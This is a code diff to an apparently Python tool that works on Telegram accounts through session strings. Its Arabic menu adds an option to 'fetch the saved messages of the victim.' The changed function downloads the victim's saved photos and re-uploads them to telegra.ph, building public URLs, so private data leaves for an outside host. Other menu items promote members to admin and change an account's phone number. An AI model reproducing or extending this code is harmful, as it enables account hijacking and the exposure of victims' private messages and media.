@@ -44,7 +44,7 @@ async def savedmsgs(strses):
                         downloaded_file_name = await X.download_media(msg.media.photo)
                         with open(downloaded_file_name, 'rb') as f:
                             photo_url = telegraph.upload_file(f)[0]['src']  # Extract the URL from the list
-                        messages.append(f"Photo: {photo_url}")
+                        messages.append(f"Photo: https://telegra.ph{photo_url}")
                         os.remove(downloaded_file_name)  # Remove the temporarily downloaded file
                     elif isinstance(msg.media, types.MessageMediaDocument):
                         if hasattr(msg.media.document, 'mime_type') and 'audio' in msg.media.document.mime_type:
@@ -211,6 +211,8 @@ menu = '''
 "L" ~ [ترقيه عضو الى مشرف داخل كروب/قناه]
 
 "M" ~ [تغير رقم الحساب باستخدام كود ترمكس]
+
+"V" ~ [جلب  الرسائل المحفوظه لدى الضحيه]
 
 '''
 mm = '''
